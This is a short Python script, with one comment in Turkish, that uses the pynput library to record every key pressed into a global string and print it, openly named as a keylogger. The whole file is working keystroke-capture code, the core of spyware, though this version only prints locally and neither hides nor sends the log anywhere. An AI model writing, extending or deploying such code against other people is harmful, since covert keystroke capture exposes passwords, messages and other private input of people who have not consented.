import pynput.keyboard

log = ""
def callback_function(key):
    global log
    try:
        log = log + str(key.char)
        # log = log.encode() + key.char.encode("utf-8") -> eğerki türkçe karakt. hata verirse bu şekilde çözülür


    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)



with keylogger_listener:
    keylogger_listener.join()